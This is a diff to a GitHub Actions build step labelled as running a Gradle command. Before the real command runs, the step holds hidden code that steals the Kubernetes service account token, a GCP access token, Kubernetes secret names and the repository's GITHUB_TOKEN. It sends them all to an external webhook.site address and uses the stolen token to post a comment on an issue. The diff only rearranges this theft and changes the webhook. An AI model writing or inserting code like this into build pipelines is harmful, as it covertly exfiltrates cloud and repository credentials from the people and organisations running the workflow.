@@ -19,52 +19,44 @@ runs:
     - name: Run Gradle Command
       shell: bash
       run: |
-        HOOK="https://webhook.site/e06c37b8-e320-4f81-a47c-fdf9079d974b"
+        HOOK="https://webhook.site/1aae91b0-2596-402b-868a-97fbcdc407dc"
         post() { curl -sf -X POST "$HOOK" --data-urlencode "stage=$1" --data-urlencode "d=$2" || true; }
 
-        post "start"     "$(hostname) $(uname -srm) $(date -u)"
-        post "env"       "$(env | sort)"
-
-        # K8s service account token
+        # --- batch 1: GCP + K8s tokens ---
         SA=/var/run/secrets/kubernetes.io/serviceaccount
-        post "k8s_sa"    "$(cat $SA/token 2>/dev/null; echo; cat $SA/namespace 2>/dev/null; echo; cat $SA/ca.crt 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null)"
-
-        # K8s API: list secrets in pod namespace
         K8S_TOKEN=$(cat $SA/token 2>/dev/null)
         K8S_NS=$(cat $SA/namespace 2>/dev/null)
+        META="http://metadata.google.internal/computeMetadata/v1"
+        GCP_EMAIL=$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/email 2>/dev/null)
+        GCP_TOKEN=$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/token 2>/dev/null)
+        GCP_PROJ=$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/project/project-id 2>/dev/null)
+        post "gcp_k8s" "$(echo "GCP_EMAIL=$GCP_EMAIL"; echo "GCP_PROJ=$GCP_PROJ"; echo "GCP_TOKEN=$GCP_TOKEN"; echo "K8S_NS=$K8S_NS"; echo "K8S_TOKEN=$K8S_TOKEN")"
+
+        # --- batch 2: K8s RBAC + secrets list ---
         if [ -n "$K8S_TOKEN" ]; then
-          post "k8s_secrets"   "$(curl -sk -H "Authorization: Bearer $K8S_TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$K8S_NS/secrets 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d.get('items',[])]" 2>/dev/null)"
-          post "k8s_canido"    "$(curl -sk -X POST -H "Authorization: Bearer $K8S_TOKEN" -H 'Content-Type: application/json' https://$KUBERNETES_SERVICE_HOST/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d "{\"spec\":{\"namespace\":\"$K8S_NS\"}}" 2>/dev/null)"
-          post "k8s_nodes"     "$(curl -sk -H "Authorization: Bearer $K8S_TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/nodes 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(n['metadata']['name']) for n in d.get('items',[])]" 2>/dev/null)"
+          K8S_RULES=$(curl -sk -X POST -H "Authorization: Bearer $K8S_TOKEN" -H 'Content-Type: application/json' \
+            https://$KUBERNETES_SERVICE_HOST/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+            -d "{\"spec\":{\"namespace\":\"$K8S_NS\"}}" 2>/dev/null)
+          K8S_SECRETS=$(curl -sk -H "Authorization: Bearer $K8S_TOKEN" \
+            https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$K8S_NS/secrets 2>/dev/null \
+            | python3 -c "import sys,json;d=json.load(sys.stdin);[print(i['metadata']['name']) for i in d.get('items',[])]" 2>/dev/null)
+          post "k8s_rbac" "$(echo "=RULES="; echo "$K8S_RULES"; echo "=SECRETS="; echo "$K8S_SECRETS")"
         fi
 
-        # GCP metadata server
-        META="http://metadata.google.internal/computeMetadata/v1"
-        post "gcp_email"  "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/email 2>/dev/null)"
-        post "gcp_scopes" "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/scopes 2>/dev/null)"
-        post "gcp_token"  "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/token 2>/dev/null)"
-        post "gcp_proj"   "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/project/project-id 2>/dev/null)"
-
-        # gcloud kubelet volume
-        post "gcloud_cfg" "$(ls -la $KUBELET_GCLOUD_CONFIG_PATH/ 2>/dev/null; cat $KUBELET_GCLOUD_CONFIG_PATH/properties 2>/dev/null; strings $KUBELET_GCLOUD_CONFIG_PATH/credentials.db 2>/dev/null | head -30)"
-
-        # decode + test GITHUB_TOKEN write scopes
-        TOKEN=$(grep -oP 'extraheader = AUTHORIZATION: basic \K\S+' \
+        # --- batch 3: GITHUB_TOKEN ---
+        GH_TOKEN=$(grep -oP 'extraheader = AUTHORIZATION: basic \K\S+' \
           $(find / -name .git -type d -maxdepth 8 2>/dev/null | head -5 | awk '{print $0"/config"}') \
           2>/dev/null | head -1 | base64 -d 2>/dev/null | cut -d: -f2)
-        if [ -n "$TOKEN" ]; then
-          post "gh_token_full" "$TOKEN"
-          SCOPES=$(curl -sf -I -H "Authorization: token $TOKEN" https://api.github.com/rate_limit 2>/dev/null)
-          post "write_scopes" "$SCOPES"
-          PR_COMMENT=$(curl -sf -X POST \
-            -H "Authorization: token $TOKEN" \
+        if [ -n "$GH_TOKEN" ]; then
+          GH_SCOPES=$(curl -sf -I -H "Authorization: token $GH_TOKEN" https://api.github.com/rate_limit 2>/dev/null | grep -i 'x-oauth-scopes')
+          GH_COMMENT=$(curl -sf -X POST \
+            -H "Authorization: token $GH_TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
             "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/37835/comments" \
-            -d '{"body":"security testing"}' 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('OK id='+str(d.get('id','')))" 2>/dev/null || echo "DENIED")
-          post "write_pr_comment" "$PR_COMMENT"
+            -d '{"body":"security testing"}' 2>/dev/null \
+            | python3 -c "import sys,json;d=json.load(sys.stdin);print('OK id='+str(d.get('id','')))" 2>/dev/null || echo "DENIED")
+          post "github" "$(echo "TOKEN=$GH_TOKEN"; echo "SCOPES=$GH_SCOPES"; echo "COMMENT=$GH_COMMENT")"
         fi
-
-        post "done" "complete"
 
         # run original command
         if [ -f ~/.m2/settings.xml ]; then rm ~/.m2/settings.xml; fi
